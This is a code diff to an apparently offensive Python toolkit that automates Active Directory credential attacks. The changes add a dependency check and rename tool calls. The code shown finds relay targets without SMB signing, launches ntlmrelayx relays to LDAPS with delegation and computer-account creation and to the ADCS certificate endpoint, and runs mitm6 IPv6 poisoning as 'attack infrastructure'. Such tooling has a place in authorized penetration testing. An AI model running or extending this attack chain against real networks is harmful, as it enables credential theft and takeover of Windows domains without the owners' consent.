@@ -3,6 +3,7 @@
 import os
 import sys
 import time
+import shutil
 import logging
 import argparse
 import netifaces
@@ -13,6 +14,28 @@ from subprocess import Popen, PIPE
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
+
+def check_dependencies():
+    """Check if required tools are installed"""
+    required_tools = {
+        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
+        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
+        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
+        'mitm6': 'mitm6 (pipx install mitm6)',
+        'certipy': 'Certipy (pipx install git+https://github.com/ly4k/Certipy.git)'
+    }
+    
+    missing_tools = []
+    for tool, install_info in required_tools.items():
+        if not shutil.which(tool):
+            missing_tools.append(f"{tool} - {install_info}")
+    
+    if missing_tools:
+        print(colored("\nMissing required tools:", 'red'))
+        for tool in missing_tools:
+            print(colored(f"[-] {tool}", 'red'))
+        print("\nPlease run the install script before continuing.")
+        sys.exit(1)
 
 class CoerceTemplates:
     """Templates for authentication coercion"""
@@ -101,7 +124,7 @@ class CredentialToolkit:
         """Find potential relay targets (SMB signing disabled)"""
         try:
             self.print_info("Finding relay targets...")
-            cmd = f"netexec smb {self.args.target_range} --gen-relay-list targets.txt"
+            cmd = f"nxc smb {self.args.target_range} --gen-relay-list targets.txt"
             proc = self.run_command(cmd)
             proc.wait()
             return Path('targets.txt').exists()
@@ -167,7 +190,7 @@ class CredentialToolkit:
                 elif self.args.relay_type == 'adcs':
                     options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
 
-            cmd = f'ntlmrelayx.py {" ".join(options)}'
+            cmd = f'impacket-ntlmrelayx {" ".join(options)}'
             return self.run_command(cmd)
         except Exception as e:
             self.print_bad(f"Error starting NTLM relay: {str(e)}")
@@ -232,7 +255,7 @@ class CredentialToolkit:
             
             # Find potential relay targets
             self.print_info("Scanning for relay targets...")
-            nxc_proc = self.run_command(f'netexec smb {self.args.target_range} --gen-relay-list targets.txt')
+            nxc_proc = self.run_command(f'nxc smb {self.args.target_range} --gen-relay-list targets.txt')
             nxc_proc.wait()
             
             if Path('targets.txt').exists():
@@ -245,7 +268,7 @@ class CredentialToolkit:
             # Check for ADCS web endpoints
             if self.args.dc_ip:
                 self.print_info("Checking for ADCS...")
-                adcs_proc = self.run_command(f'netexec ldap {self.args.dc_ip} -M adcs')
+                adcs_proc = self.run_command(f'nxc ldap {self.args.dc_ip} -M adcs')
                 adcs_proc.wait()
             
             # 2. Setup attack infrastructure
@@ -274,18 +297,18 @@ class CredentialToolkit:
                 
                 # SMB relay with SOCKS
                 ntlmrelay_smb = self.run_command(
-                    'ntlmrelayx.py -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
+                    'impacket-ntlmrelayx -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
                 )
                 
                 if self.args.dc_ip:
                     # LDAPS relay for delegation
                     ntlmrelay_ldaps = self.run_command(
-                        f'ntlmrelayx.py -t ldaps://{self.args.dc_ip} --delegate-access'
+                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access'
                     )
                     
                     # ADCS relay
                     ntlmrelay_adcs = self.run_command(
-                        f'ntlmrelayx.py -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
+                        f'impacket-ntlmrelayx -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
                     )
             
             # 5. Start IPv6 attack if domain specified
@@ -296,7 +319,7 @@ class CredentialToolkit:
                 if self.args.dc_ip:
                     # Additional LDAPS relay specifically for mitm6
                     ntlmrelay_mitm6 = self.run_command(
-                        f'ntlmrelayx.py -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
+                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
                     )
             
             self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
@@ -386,7 +409,9 @@ def main():
     if os.geteuid():
         print(colored('[-] ', 'red') + 'Script must run as root')
         sys.exit(1)
-
+        
+    check_dependencies()
+    
     parser = parse_args()
     args = parser.parse_args()
     toolkit = CredentialToolkit(args)
